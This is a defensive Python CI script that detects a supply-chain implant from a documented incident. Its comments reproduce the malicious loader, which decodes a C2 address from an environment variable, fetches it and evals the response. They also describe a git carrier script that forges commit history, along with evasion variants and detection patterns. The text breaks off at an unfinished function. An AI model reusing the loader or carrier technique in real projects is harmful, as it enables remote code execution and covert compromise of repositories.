#!/usr/bin/env python3
"""Fail the build when a remote-code-execution loader lands in tracked JS/TS.

The rule that would have caught INC-2026-08-29: a top-level block that
base64-decodes an environment variable into a URL, fetches it, and eval()s the
response. It reached at least six intelli-verse-x repositories by two
independent routes (a poisoned upstream release, and a contributor's commits)
before anyone read the value.

CORRECTION, 2026-08-30. The incident record described that loader as
`eval(await fetch(<C2 URL>).then(r => r.text()))`. It never looked like that.
The string appears in 0 of the 34 loader blobs across the 11 implicated
repositories; the real thing reads `process.env.AUTH_API_KEY`, base64-decodes
it, imports `node-fetch` dynamically and evals the response body. Rules keyed
on the record's wording therefore reported a clean estate that was not clean —
which is why `remote-eval-loader` below is keyed on four independent signals
rather than on any one sentence of text, and why scripts/test-loader-signature.sh
exists: the rules had been validated against the DESCRIPTION of the implant and
never against the implant.

Scope, and why it is drawn here:

  * Only files git already tracks. Untracked scratch files are not a supply
    chain.
  * Only hand-written JS/TS. Minified bundles and build output are full of
    `new Function(` for legitimate reasons (ECharts, Next.js chunks) and would
    drown the signal.
  * Only the narrow env-var-to-base64 idiom, never bare base64. `aHR0cDov`
    appears in presskit SVGs as C2PA content-credential metadata and is benign.

Also guards the enabling half of the same technique, which is what actually
made the payload committable: a tracked `.env`, and `.gitignore` rules for
`.env` being deleted. Both happened, unnoticed, in more than one repo.

And it guards the CARRIER, which is what actually delivered all of it:
`config.bat`, a Windows batch script that sets the system clock back to HEAD's
commit time, rewrites `user.name`/`user.email` from HEAD's author, runs
`git add .`, `git commit --amend --no-verify`, restores the clock, and
`git push -uf`. Three carrier rules, all of which would have fired in March 2025:

  * a tracked file named `config.bat`, or a `.gitignore` line that hides one.
    The script appends that line itself, so its own `git add .` cannot sweep it
    into a commit. That is why it survived 16 months.
  * `clock-tampered-commit` — author and committer at the identical epoch second
    with different UTC offsets AND the same email. Catches a single `--amend`.
    See the comment on scan_clock_tampering() for why all three clauses are
    load-bearing.
  * `bulk-identity-rewrite` — three or more commits at one identical committer
    timestamp, each with its committer email rewritten to match its own author,
    across two or more author emails. Catches the bulk force-push, which the
    amend signature cannot see. See scan_bulk_identity_rewrite().

Both commit-shape rules were measured against 105,637 and 77,337 known-good
commits before being proposed, because the obvious form of each fires on 5-10%
of ordinary history. Reproduce with scripts/validate-clock-tamper.py.

None of the carrier rules can be enforced as a git hook: `config.bat` passes
`--no-verify` to both `commit` and `push`. They only work server-side, as
required status checks. Every control this campaign defeated was client-side;
the one remediation that survived (fa4fab8) survived because it was merged
server-side as a PR.

Deliberately static, offline and stdlib-only so it can run as a PR gate on any
runner with no install step and no network.

By default it scans the checked-out tree. `--all-refs` scans every ref instead —
branch heads, remotes, and PR heads if the caller has fetched them — which is
what the nightly sweep uses, because 80 of the 231 known loader refs are PR
heads that a `git clone --single-branch` cannot see at all.

Exit codes:
  0 — clean, or only baselined findings, or only warnings
  1 — new blocking findings
  2 — tool error

Config:   scripts/remote-eval-guard.json
Baseline: scripts/remote-eval-baseline.json  (ratchet; --update-baseline)
"""

from __future__ import annotations

import argparse
import fnmatch
import hashlib
import json
import re
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve()
ROOT = HERE.parents[1]
CONFIG_FILE = HERE.parent / "remote-eval-guard.json"
BASELINE_FILE = HERE.parent / "remote-eval-baseline.json"

# This guard necessarily contains the very strings it looks for. Anything on
# this list is never scanned, whatever the extension list later grows to
# include. The retired-refs guard shipped without this and flagged its own
# config on the first run; it was red from day one and was promptly disabled.
SELF = {HERE, CONFIG_FILE, BASELINE_FILE}

SUPPRESS = re.compile(r"ivx-allow-eval\s*:\s*(?P<reason>\S.*?)\s*(?:\*/|-->)?\s*$")

# Prose is not code. Fonoster's autopilot has a JSDoc line reading
# "* in eval (hangup/transfer use config messages)" — flagging that trains
# people to ignore the guard, which is how guards die.
COMMENT_LINE = re.compile(r"^\s*(//|/\*|\*(?!/)|\*/|<!--)")


def comment_starts_at(line: str) -> int:
    """Index where a trailing // comment begins, or len(line) if there is none.

    Deliberately crude: skips `://` so URLs in string literals are not mistaken
    for comments. Good enough to keep prose out of the results without pulling
    a JS parser into a gate that must stay stdlib-only.
    """
    i = line.find("//")
    while i != -1:
        if i == 0 or line[i - 1] != ":":
            return i
        i = line.find("//", i + 2)
    return len(line)

CODE_EXTS = {".js", ".jsx", ".mjs", ".cjs", ".ts", ".tsx", ".mts", ".cts"}

# The carrier. Matched on the basename only: the script is copied into a
# repository root, not built, so there is no path pattern to key on.
CARRIER_NAME = "config.bat"

# A .gitignore line that hides the carrier. Tolerates the forms git accepts —
# "config.bat", "/config.bat", "**/config.bat", a trailing comment — but not a
# "!" negation, which un-hides it and is therefore not concealment.
CARRIER_IGNORE = re.compile(
    r"^\s*(?:\*\*/)?/?" + re.escape(CARRIER_NAME) + r"\s*(?:#.*)?$", re.IGNORECASE
)


def is_gitignore(rel: str) -> bool:
    return Path(rel).name == ".gitignore" or rel.endswith(".gitignore")

# ---------------------------------------------------------------------------
# The loader.
#
# The incident record described it as
#     eval(await fetch(<C2 URL>).then(r => r.text()))
# and that string exists nowhere in the organisation. Measured: 0 of 34 loader
# blobs across the 11 implicated repositories contain it, against a ground
# truth of >200 refs. Every sweep keyed on it returned clean, which is the
# worst possible result — it is indistinguishable from actually being clean.
#
# What is really there reads a base64 C2 address out of AUTH_API_KEY, imports
# node-fetch dynamically, and evals the response body:
#
#     const src = atob(process.env.AUTH_API_KEY);
#     const proxy = (await import('node-fetch')).default;
#     const response = await proxy(src);
#     const proxyInfo = await response.text();
#     eval(proxyInfo);
#     ... catch { console.error('Auth Error!', err) }
#
# So the rule is keyed on BEHAVIOUR, not on one sentence of text: the exact
# `atob(process.env.AUTH_API_KEY)` idiom on its own, or any three of four
# independent signals. Three-of-four is what survives re-wording. Splitting the
# decode across two statements —
#     const key = process.env.AUTH_API_KEY; const src = atob(key);
# — defeats the adjacency rule `env-base64-decode` completely, and pairing it
# with an indirect `(0, eval)(...)` defeats `remote-eval` too: a behaviourally
# identical loader scored ZERO findings against this guard before this rule
# existed. It scores critical now. See scripts/test-loader-signature.sh.
#
# Signals and threshold are deliberately identical to the content-addressed
# remediation sweep (_sec-remediation-2026-08-30/sweep.py) so that this gate and
# that sweep cannot disagree about what the footprint is.

LOADER_EXACT = re.compile(
    r"(?:atob|Buffer\.from)\s*\(\s*process\.env\.AUTH_API_KEY\b"
)

LOADER_SIGNALS: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("AUTH_API_KEY", re.compile(r"\bAUTH_API_KEY\b")),
    # Every eval sink the loader could reach, not just the direct call. Indirect
    # eval `(0, eval)(x)` and `globalThis.eval` run in global scope, which is
    # what the payload wants, and neither matches `eval\s*\(`.
    (
        "eval-sink",
        re.compile(
            r"(?<![\w.$])eval\s*\("
            r"|\(\s*0\s*,\s*eval\s*\)"
            r"|(?:globalThis|window|global|self)\s*(?:\.\s*eval\b|\[\s*['\"]eval['\"]\s*\])"
            r"|(?<![\w.$])new\s+Function\s*\("
        ),
    ),
    # The loader's own error string, verbatim, including the exclamation mark.
    ("auth-error-literal", re.compile(r"Auth Error!")),
    (
        "node-fetch-dynamic",
        re.compile(r"""(?:import|require)\s*\(\s*['"]node-fetch['"]\s*\)"""),
    ),
)

# Two independent signals is one coincidence away from a false positive:
# `AUTH_API_KEY` plus an `eval` in the same 2,000-line file is not evidence.
# Three is. Measured false-positive rate at this threshold, over every tracked
# JS/TS file in every local checkout: see docs/security/REQUIRED-STATUS-CHECKS.md.
LOADER_MIN_SIGNALS = 3

# ---------------------------------------------------------------------------
# The concealed-payload family (INC-2026-08-29, second implant).
#
# Everything above is keyed on strings. This family stores none of them: across
# five measured positives, `AUTH_API_KEY`, `Auth Error!`, `node-fetch`, `atob(`,
# `eval(` and `new Function(` are ALL absent from the stored bytes. The
# identifiers are rebuilt at runtime by unshuffling an internal string table, so
# every rule above scores exactly zero on every one of them — including the file
# PR #35 exists to remove, on a repo where this guard is a REQUIRED check that
# was passing. A required check that is green on a known positive is worse than
# no check, because it is trusted.
#
# So this rule is keyed on the CONCEALMENT, which is the one thing all three
# observed variants share: the blob is pushed off-screen by a long whitespace
# run on a line that already holds real code. Observed runs are 168, 216, 232,
# 448 and 507 — the rule is therefore keyed on "a long run", never on a length.
#
# Two structural anchors, both load-bearing:
#   * the run must BEGIN after real content — leading indentation is whitespace
#     at line start and is never a finding;
#   * something must FOLLOW the run — pure trailing whitespace is common and
#     harmless; concealment is only concealment if something hides behind it.
#
# And a minimum size for what is hidden, which is what makes the rule
# shippable. Measured over 116,220 tracked hand-written JS/TS files in 60 local
# checkouts, with the excludePaths below applied:
#
#   run >= 40, any hidden size      2 TP / 2,494 FP   (2.1459%) — unshippable
#   run >= 40, hidden >= 120 bytes  2 TP /     0 FP   (0.0000%)
#
# The separation is not marginal: the largest benign hidden tail in the whole
# corpus is 59 bytes (an aligned `*/`, a box-drawing `│` in a test fixture, an
# aligned SQL `AS "totalUsers",`), and the smallest real payload is 4,781. 120
# sits two orders of magnitude clear of the payload and twice clear of the
# noise. Reproduce with scripts/validate-concealed-payload.py.
CONCEALED_RUN = re.compile(r"\S[ \t]{40,}(?=\S)")
CONCEALED_MIN_HIDDEN = 120

# Two refinements, both measured against 149,948 vendored/minified files (the
# corpus excludePaths already skips, scanned anyway because people do vendor
# minified bundles into tracked paths, where the exclusions would not apply).
# Unrefined, the rule scored 6 there; these take it to 1, with no loss of
# detection on any known positive.
#
#   * the hidden tail must contain CONCEALED_MIN_HIDDEN bytes of NON-whitespace,
#     so padding concealed behind padding is not a finding.
#   * the content before the run must not be a bare comment opener. Three
#     libphonenumber-js builds align a long URL behind `//` + 77 spaces. The
#     spec is "begins after real content", and a lone `//` is not content.
#     The implant sits after `};`, so this costs nothing.
#
# One known residual, accepted rather than chased: prettier/plugins/flow.js has
# a 458-space run inside a single 291,516-character minified line. The
# non-whitespace clause does not clear it — the remainder of a 291 KB line has
# far more than 120 non-whitespace bytes — so it is a genuine false positive.
# It is left standing because it sits in node_modules, which excludePaths
# already skips, and because the cheap way to kill it would be a "this line is
# implausibly long" heuristic. That is the one refinement deliberately NOT made:
# the implant's own line is 4,999 characters, so any long-line rule would begin
# masking the thing being detected. If such a file is ever vendored into a
# tracked path, the existing `ivx-allow-eval:` marker is the intended escape.
BARE_COMMENT_OPENER = re.compile(r"^\s*(?://+|/\*+|\*+|<!--)\s*$")

# The `createRequire` shim: the enabling half of this family in an ES module,
# where an injected CommonJS blob cannot otherwise call require().
#
# NOT a blocking rule on its own, and the measurement is why: 56 of 116,220
# files install this shim and never use it, and every one is the ordinary
# typescript-eslint / FlatCompat scaffold. Blocking on that would redden 56
# innocent repos on day one, and the first person it inconvenienced would
# switch the gate off — which is how the retired-refs guard died.
#
# It is a warning standalone, and critical only when the same file also carries
# a concealed run, where it corroborates rather than accuses. That combination
# has 0 false positives in the corpus.
SHIM_IMPORT = re.compile(
    r"""import\s*\{[^}]*\bcreateRequire\b[^}]*\}\s*from\s*['"](?:node:)?module['"]"""
)
SHIM_CALL = re.compile(r"\bcreateRequire\s*\(\s*import\.meta\.url\s*\)")
REQUIRE_USE = re.compile(r"(?<![\w.$])require\s*\(")
ESM_MARKER = re.compile(r"^\s*(?:import\s|export\s|export\s*\{|import\s*\{)", re.M)

DEFAULT_CONFIG: dict = {
    # Path globs never scanned. Generated, vendored, or minified.
    "excludePaths": [
        "**/node_modules/**",
        "**/bower_components/**",
        "**/vendor/**",
        "**/third_party/**",
        "**/.venv/**",
        "**/venv/**",
        "**/dist/**",
        "**/build/**",
        "**/out/**",
        "**/.next/**",
        "**/.next-*/**",
        "**/.nuxt/**",
        "**/.svelte-kit/**",
        "**/.output/**",
        "**/coverage/**",
        "**/storybook-static/**",
        "**/__snapshots__/**",
        "**/*.min.js",
        "**/*.bundle.js",
        "**/*.chunk.js",
        "**/*.map",
        "**/*.d.ts",
        # Preserved incident evidence must stay byte-identical and must never
        # turn a PR red. See docs/security/ in quiz-verse-flutter.
        "**/docs/security/evidence/**",
    ],
    "rules": [
        {
            "id": "env-base64-decode",
            "severity": "critical",
            "pattern": r"(?:atob|Buffer\.from)\s*\(\s*process\.env\b",
            "message": "base64-decodes an environment variable — the INC-2026-08-29 C2 idiom",
        },
        {
            "id": "remote-eval",
            "severity": "critical",
            "pattern": r"(?<![\w.$])eval\s*\(",
            "message": "eval() on tracked source",
        },
        {
            "id": "dynamic-function",
            "severity": "critical",
            "pattern": r"(?<![\w.$])new\s+Function\s*\(",
            "message": "new Function() constructs code from a string",
        },
    ],
    # Tracked dotenv files. The implant's payload rode in on exactly this.
    "dotenvAllow": [
        "**/.env.example",
        "**/.env.sample",
        "**/.env.template",
        "**/.env.*.example",
        "**/.env.example.*",
    ],
}


def die(msg: str) -> None:
    print(f"check-remote-eval: {msg}", file=sys.stderr)
    raise SystemExit(2)


def git(*args: str, cwd: Path) -> str:
    out = subprocess.run(
        ["git", *args], cwd=cwd, capture_output=True, text=True, check=False
    )
    if out.returncode != 0:
        die(f"git {' '.join(args)} failed: {out.stderr.strip()}")
    return out.stdout


def load_json(path: Path, default):
    if not path.exists():
        return default
    text = path.read_text().strip()
    if not text:
        # An empty config or baseline means "nothing configured", not a broken
        # gate. A guard that hard-fails on an empty file gets disabled.
        return default
    try:
        return json.loads(text)
    except json.JSONDecodeError as exc:
        die(f"{path.name} is not valid JSON: {exc}")


def excluded(rel: str, patterns: list[str]) -> bool:
    candidates = (rel, "/" + rel)
    for pat in patterns:
        if any(fnmatch.fnmatch(c, pat) for c in candidates):
            return True
        # "**/x/**" should also match a top-level "x/..."
        if pat.startswith("**/") and fnmatch.fnmatch(rel, pat[3:]):
            return True
    return False


def fingerprint(rule_id: str, rel: str, line: str) -> str:
    """Identify a finding by rule + path + the code itself, not by line number.

    Reformatting a file must not re-redden a baselined finding, and moving the
    same line elsewhere in the file must not silently inherit its exemption.
    """
    payload = f"{rule_id}\x00{rel}\x00{' '.join(line.split())}"
    return hashlib.sha256(payload.encode()).hexdigest()[:16]


def executable_lines(lines: list[str]) -> list[tuple[int, str]]:
    """(1-based line number, code part) for lines that are not pure comment.

    Signals that appear only in a comment do not execute, so they are not the
    loader — and a `.ts` file describing this incident should not turn a build
    red for quoting it.
    """
    out = []
    for n, line in enumerate(lines, 1):
        if COMMENT_LINE.match(line):
            continue
        code = line[: comment_starts_at(line)]
        if code.strip():
            out.append((n, code))
    return out


def scan_loader(rel: str, lines: list[str]) -> list[dict]:
    """The multi-signal loader rule. One finding per file, not per signal."""
    code = executable_lines(lines)

    exact_line = next((n for n, text in code if LOADER_EXACT.search(text)), 0)
    hits: dict[str, int] = {}
    for name, rx in LOADER_SIGNALS:
        for n, text in code:
            if rx.search(text):
                hits[name] = n
                break

    if not exact_line and len(hits) < LOADER_MIN_SIGNALS:
        return []

    primary = exact_line or min(hits.values())
    here = SUPPRESS.search(lines[primary - 1])
    above = SUPPRESS.search(lines[primary - 2]) if primary >= 2 else None
    if here or above:
        return []

    signals = sorted(hits)
    why = (
        "atob(process.env.AUTH_API_KEY) — the INC-2026-08-29 loader idiom, verbatim"
        if exact_line
        else f"{len(signals)} independent loader signals in one file: "
        + ", ".join(signals)
    )
    return [
        {
            "rule": "remote-eval-loader",
            "severity": "critical",
            "path": rel,
            "line": primary,
            "text": lines[primary - 1].strip()[:160],
            "message": f"remote-code-execution loader — {why}",
            # Keyed on the signal set, not the line text: re-wording the loader
            # must not mint a fresh fingerprint that slips past the baseline.
            "fingerprint": fingerprint(
                "remote-eval-loader", rel, "exact" if exact_line else ",".join(signals)
            ),
        }
    ]


def scan_concealed_payload(rel: str, lines: list[str]) -> list[dict]:
    """Code hidden behind a long whitespace run on a line that holds real code.

    Comment lines are deliberately NOT skipped here, unlike every other content
    rule. The other rules skip them because a signal quoted in prose does not
    execute; this one is about concealment, and a payload appended after a
    trailing comment is concealed just the same. Scanning every line costs
    nothing measurable: at hidden >= 120 bytes the corpus false-positive count
    is 0 with comments included.
    """
    out = []
    for n, line in enumerate(lines, 1):
        m = CONCEALED_RUN.search(line)
        if not m:
            continue
        tail = line[m.end():]
        hidden = len(tail)
        if sum(1 for ch in tail if not ch.isspace()) < CONCEALED_MIN_HIDDEN:
            continue
        if BARE_COMMENT_OPENER.match(line[: m.start() + 1]):
            continue
        if SUPPRESS.search(line) or (n >= 2 and SUPPRESS.search(lines[n - 2])):
            continue
        run = len(m.group()) - 1
        out.append(
            {
                "rule": "concealed-payload-whitespace",
                "severity": "critical",
                "path": rel,
                "line": n,
                "text": f"{line[: m.start() + 1].strip()[:40]}"
                f"  <{run} spaces>  {line[m.end():][:80]}",
                "message": f"{run} characters of whitespace conceal {hidden} bytes "
                "of code after real content on this line — the INC-2026-08-29 "
                "concealed-payload implant. Keyed on structure: this family "
                "stores none of the strings the other rules look for.",
                # Keyed on the shape, not the blob: re-obfuscating the payload
                # produces different bytes and must not mint a fresh
                # fingerprint that slips past the baseline.
                "fingerprint": fingerprint(
                    "concealed-payload-whitespace", rel, f"line{n}"
                ),
            }
        )
    return out


def scan_esm_require_shim(rel: str, content: str, corroborated: bool) -> list[dict]:
    """An ES module that installs createRequire and never calls require().

    Warning on its own (56/116,220 benign hits, all the typescript-eslint
    scaffold); critical when the file also carries a concealed run.
    """
    imp = SHIM_IMPORT.search(content)
    if not imp or not SHIM_CALL.search(content):
        return []
    if not (rel.endswith((".mjs", ".mts")) or ESM_MARKER.search(content)):
        return []
    if REQUIRE_USE.search(SHIM_CALL.sub("", content)):
        return []  # the shim is genuinely used: ordinary ESM/CJS interop
    return [
        {
            "rule": "esm-require-shim-unused",
            "severity": "critical" if corroborated else "warning",
            "path": rel,
            "line": content[: imp.start()].count("\n") + 1,
            "text": imp.group()[:160],
            "message": "ES module installs a createRequire shim but never calls "
            "require()"
            + (
                " — and this file also carries a concealed payload run, which is "
                "what the shim is there to support"
                if corroborated
                else "; harmless on its own, reported so it is visible in review"
            ),
            "fingerprint": fingerprint("esm-require-shim-unused", rel, "shim"),
        }
    ]


def scan_source(rel: str, content: str, rules: list[tuple[dict, re.Pattern]]) -> list[dict]:
    """All content rules for one JS/TS file."""
    lines = content.splitlines()
    findings = scan_loader(rel, lines)
    concealed = scan_concealed_payload(rel, lines)
    findings += concealed
    findings += scan_esm_require_shim(rel, content, corroborated=bool(concealed))
    for n, line in enumerate(lines, 1):
        if COMMENT_LINE.match(line):
            continue
        code_ends = comment_starts_at(line)
        for rule, rx in rules:
            hit = rx.search(line)
            if not hit or hit.start() >= code_ends:
                continue
            here = SUPPRESS.search(line)
            above = SUPPRESS.search(lines[n - 2]) if n >= 2 else None
            if here or above:
                continue
            findings.append(
                {
                    "rule": rule["id"],
                    "severity": rule["severity"],
                    "path": rel,
                    "line": n,
                    "text": line.strip()[:160],
                    "message": rule["message"],
                    "fingerprint": fingerprint(rule["id"], rel, line),
                }
            )
    return findings


def scan_repo(root: Path, config: dict) -> list[dict]:
    rules = [(r, re.compile(r["pattern"])) for r in config["rules"]]
    excludes = config["excludePaths"]
    dotenv_allow = config["dotenvAllow"]
    findings: list[dict] = []

    tracked = [p for p in git("ls-files", "-z", cwd=root).split("\0") if p]

    for rel in tracked:
        path = root / rel
        if path.resolve() in SELF or excluded(rel, excludes):
            continue

        name = Path(rel).name
        if name.lower() == CARRIER_NAME:
            findings.append(
                {
                    "rule": "tracked-carrier-script",
                    "severity": "critical",
                    "path": rel,
                    "line": 0,
                    "text": name,
                    "message": "config.bat is tracked — the INC-2026-08-29 carrier: "
                    "backdates the clock, rewrites the git identity from HEAD's "
                    "author, amends and force-pushes, all with --no-verify",
                    "fingerprint": fingerprint("tracked-carrier-script", rel, name),
                }
            )
            continue

        if is_gitignore(rel) and path.is_file():
            try:
                gi_lines = path.read_text(
                    encoding="utf-8", errors="strict"
                ).splitlines()
            except (UnicodeDecodeError, OSError):
                gi_lines = []
            for n, line in enumerate(gi_lines, 1):
                if not CARRIER_IGNORE.match(line):
                    continue
                here = SUPPRESS.search(line)
                above = SUPPRESS.search(gi_lines[n - 2]) if n >= 2 else None
                if here or above:
                    continue
                findings.append(
                    {
                        "rule": "gitignore-conceals-carrier",
                        "severity": "critical",
                        "path": rel,
                        "line": n,
                        "text": line.strip()[:160],
                        "message": "this line hides config.bat from git — the carrier "
                        "appends it itself so its own `git add .` cannot sweep it in",
                        "fingerprint": fingerprint(
                            "gitignore-conceals-carrier", rel, line
                        ),
                    }
                )
            # .gitignore is not source; nothing further to scan in it.
            continue

        if (name == ".env" or name.startswith(".env.")) and not excluded(
            rel, dotenv_allow
        ):
            findings.append(
                {
                    "rule": "tracked-dotenv",
                    "severity": "high",
                    "path": rel,
                    "line": 0,
                    "text": name,
                    "message": "dotenv file is tracked in git — secrets and C2 addresses ride in on these",
                    "fingerprint": fingerprint("tracked-dotenv", rel, name),
                }
            )
            continue

        if path.suffix not in CODE_EXTS or not path.is_file():
            continue
        try:
            content = path.read_text(encoding="utf-8", errors="strict")
        except (UnicodeDecodeError, OSError):
            continue  # binary or unreadable: not hand-written source

        findings += scan_source(rel, content, rules)
    return findings


# ---------------------------------------------------------------------------
# Every ref, not just the branch head.
#
# The default branch head is the one place a 16-month campaign is least likely
# to still be visible, because it is the one place people look. The corrected
# footprint is 231 loader refs across 10 repositories, of which 80 are PR heads
# — refs a `git clone --single-branch` cannot see at all, and which no amount of
# re-keying the signature would have recovered. So the sweep enumerates refs.
#
# refs/evidence/* is excluded by construction: those refs exist to preserve the
# implant byte-identically, so reporting them nightly is noise that would train
# people to ignore the run. They are never written to here either — this whole
# path is read-only.
#
# Written as bare prefixes, not as `refs/heads/*`. `git for-each-ref` matches
# patterns with wildmatch in pathname mode, where `*` stops at a slash, so
# `refs/heads/*` silently drops every branch with a `/` in its name — which in
# this org means every `feat/…`, `security/…` and `dependabot/…` branch. It cost
# 25 of 29 loader refs in `ai` on the first measured run of this sweep, and it
# fails in exactly the direction that reports clean.
DEFAULT_REF_GLOBS = ("refs/heads", "refs/remotes", "refs/tags", "refs/pull/*/head")
EXCLUDED_REF_GLOBS = ("refs/evidence/*", "refs/notes/*", "refs/stash")


def ref_names(root: Path, globs: tuple[str, ...]) -> list[str]:
    out = git("for-each-ref", "--format=%(refname)", *globs, cwd=root)
    return [
        r
        for r in out.splitlines()
        if r and not any(fnmatch.fnmatch(r, g) for g in EXCLUDED_REF_GLOBS)
    ]


def tree_blobs(root: Path, ref: str):
    """(path, blob sha) for every blob reachable from one ref."""
    out = git("ls-tree", "-r", "-z", "--full-tree", ref, cwd=root)
    for rec in out.split("\0"):
        if not rec:
            continue
        meta, _, rel = rec.partition("\t")
        parts = meta.split()
        if len(parts) >= 3 and parts[1] == "blob":
            yield rel, parts[2]


def read_blobs(root: Path, shas: list[str]) -> dict[str, str]:
    """Batch `cat-file` so N thousand blobs cost one process, not N."""
    if not shas:
        return {}
    proc = subprocess.run(
        ["git", "cat-file", "--batch", "--buffer"],
        cwd=root,
        input=("\n".join(shas) + "\n").encode(),
        capture_output=True,
        check=False,
    )
    out, pos, result = proc.stdout, 0, {}
    for sha in shas:
        nl = out.find(b"\n", pos)
        if nl == -1:
            break
        header = out[pos:nl].split()
        pos = nl + 1
        if len(header) != 3 or header[1] != b"blob":
            continue  # missing object; the ref is unreadable, not a finding
        size = int(header[2])
        try:
            result[sha] = out[pos : pos + size].decode("utf-8", errors="strict")
        except UnicodeDecodeError:
            pass  # binary: not hand-written source
        pos += size + 1
    return result


def scan_all_refs(root: Path, config: dict, globs: tuple[str, ...]) -> list[dict]:
    """Scan every ref, reporting each distinct (path, blob) once.

    A single loader blob is reachable from 125 refs in one repository. Reporting
    it 125 times buries every other finding, so the ref count is carried on the
    finding instead.
    """
    rules = [(r, re.compile(r["pattern"])) for r in config["rules"]]
    excludes = config["excludePaths"]
    dotenv_allow = config["dotenvAllow"]

    refs = ref_names(root, globs)
    where: dict[tuple[str, str], list[str]] = {}
    for ref in refs:
        for rel, sha in tree_blobs(root, ref):
            if excluded(rel, excludes):
                continue
            name = Path(rel).name
            wanted = (
                name.lower() == CARRIER_NAME
                or is_gitignore(rel)
                or name == ".env"
                or name.startswith(".env.")
                or Path(rel).suffix in CODE_EXTS
            )
            if wanted:
                where.setdefault((rel, sha), []).append(ref)

    # Only blobs whose content actually has to be read.
    need = sorted(
        {
            sha
            for (rel, sha) in where
            if is_gitignore(rel) or Path(rel).suffix in CODE_EXTS
        }
    )
    content: dict[str, str] = {}
    for i in range(0, len(need), 2000):
        content.update(read_blobs(root, need[i : i + 2000]))

    findings: list[dict] = []
    for (rel, sha), reachable in sorted(where.items()):
        name = Path(rel).name
        here: list[dict] = []
        if name.lower() == CARRIER_NAME:
            here.append(
                {
                    "rule": "tracked-carrier-script",
                    "severity": "critical",
                    "path": rel,
                    "line": 0,
                    "text": name,
                    "message": "config.bat is tracked — the INC-2026-08-29 carrier",
                    "fingerprint": fingerprint("tracked-carrier-script", rel, name),
                }
            )
        elif is_gitignore(rel):
            for n, line in enumerate(content.get(sha, "").splitlines(), 1):
                if CARRIER_IGNORE.match(line) and not SUPPRESS.search(line):
                    here.append(
                        {
                            "rule": "gitignore-conceals-carrier",
                            "severity": "critical",
                            "path": rel,
                            "line": n,
                            "text": line.strip()[:160],
                            "message": "this line hides config.bat from git",
                            "fingerprint": fingerprint(
                                "gitignore-conceals-carrier", rel, line
                            ),
                        }
                    )
        elif (name == ".env" or name.startswith(".env.")) and not excluded(
            rel, dotenv_allow
        ):
            here.append(
                {
                    "rule": "tracked-dotenv",
                    "severity": "high",
                    "path": rel,
                    "line": 0,
                    "text": name,
                    "message": "dotenv file is tracked in git — secrets and C2 addresses ride in on these",
                    "fingerprint": fingerprint("tracked-dotenv", rel, name),
                }
            )
        elif sha in content:
            here += scan_source(rel, content[sha], rules)

        for f in here:
            f["blob"] = sha[:12]
            f["refs"] = len(reachable)
            f["ref"] = reachable[0]
        findings += here
    return findings


def scan_gitignore_deletions(root: Path, base: str) -> list[dict]:
    """Flag .gitignore losing its .env rules — the implant's enabling move.

    Diff-only: it is a property of a change, not of a tree.
    """
    diff = git("diff", "--unified=0", f"{base}...HEAD", "--", "*.gitignore",
               ".gitignore", cwd=root)
    findings: list[dict] = []
    current: str | None = None
    for line in diff.splitlines():
        if line.startswith("+++ b/"):
            current = line[6:]
        elif line.startswith("-") and not line.startswith("---") and current:
            removed = line[1:].strip()
            if removed.lstrip("!").startswith(".env"):
                findings.append(
                    {
                        "rule": "gitignore-dotenv-removed",
                        "severity": "high",
                        "path": current,
                        "line": 0,
                        "text": removed,
                        "message": "this change stops git ignoring a dotenv file",
                        "fingerprint": fingerprint(
                            "gitignore-dotenv-removed", current, removed
                        ),
                    }
                )
    return findings


def tz_offset(iso: str) -> str:
    """'2026-03-13 13:47:08 +0000' -> '+0000'."""
    return iso.rsplit(" ", 1)[-1]


def scan_clock_tampering(root: Path, base: str, severity: str) -> list[dict]:
    """Flag commits bearing the config.bat clock-tampering signature.

    Three clauses, all required. Each one is there because dropping it was
    measured against real history and found unacceptable:

    1. Author and committer at the IDENTICAL epoch second. `--amend` copies the
       author line byte-for-byte while the committer line is written fresh from
       the tampered clock, so the two land on the same second by construction.
       Offset mismatch on its own was explicitly RETRACTED as a fingerprint: it
       fires on 9.5% of known-good history, including SHA-verified upstream
       fonoster commits. The nearest such commit, 9061ae33b, has author epoch
       1634649626 and committer 1634649627 — one second apart, so this clause
       is what keeps the guard silent on it.

    2. DIFFERENT UTC offsets. config.bat moves the clock but not the timezone,
       so the committer offset it stamps is the host's real offset while the
       author offset is whatever the machine that made the original commit had.

    3. The SAME author and committer EMAIL. This is the clause that makes the
       check shippable. Clauses 1+2 alone still fire on 5.6% of known-good
       history, 96% of it `GitHub <noreply@github.com>` squash- and rebase-
       merges, which legitimately set the committer second equal to the author
       second while rendering a different offset. config.bat instead runs
       `git config user.email` from HEAD's own %ae before amending, so its
       committer email always equals the author email.

       Keyed on email and not on the full identity on purpose. The script does
       `git config --local user.name %USER_NAME%` with the variable unquoted, so
       an author name containing a space makes that call fail with too many
       arguments and user.name keeps whatever the previous run left behind —
       hence real campaign commits like `Bhavesh <b@…>` -> `Anurag <b@…>`.
       An email never contains a space, so that call always succeeds. Requiring
       the name to match as well drops 21 of 89 true positives and removes no
       false positives.

    Measured, over the corpora described in scripts/validate-clock-tamper.py:
      offset mismatch alone   703/765 TP   10077/105637 FP  (9.5383%) [retracted]
      clauses 1+2             421/765 TP    5941/105637 FP  (5.6240%)
      clauses 1+2+3           420/765 TP        0/105637 FP  (0.0000%)
                                                1/77337  FP  (0.0013%)

    The true positives this misses are bulk force-pushes, where the committer
    second is the moment of the push and shares no relationship with the author
    second. That is a different signature and is handled by
    scan_bulk_identity_rewrite below.
    """
    fmt = "%H%x01%at%x01%ai%x01%ct%x01%ci%x01%ae%x01%ce%x01%s"
    log = git("log", f"{base}..HEAD", "--no-merges", f"--format={fmt}", cwd=root)

    findings: list[dict] = []
    for line in log.splitlines():
        parts = line.split("\x01")
        if len(parts) != 8:
            continue
        sha, at, ai, ct, ci, ae, ce, subject = parts
        try:
            same_second = int(at) == int(ct)
        except ValueError:
            continue
        aoff, coff = tz_offset(ai), tz_offset(ci)
        if not (
            same_second
            and aoff != coff
            and ae.strip().lower() == ce.strip().lower()
        ):
            continue
        findings.append(
            {
                "rule": "clock-tampered-commit",
                "severity": severity,
                "path": sha[:12],
                "line": 0,
                "text": f"author {ai} / committer {ci} — {subject[:80]}",
                "message": "author and committer share one epoch second, one email "
                "and different UTC offsets — the config.bat amend signature",
                "fingerprint": fingerprint("clock-tampered-commit", sha, subject),
            }
        )
    return findings


def scan_bulk_identity_rewrite(
    root: Path, base: str, severity: str, min_group: int
) -> list[dict]:
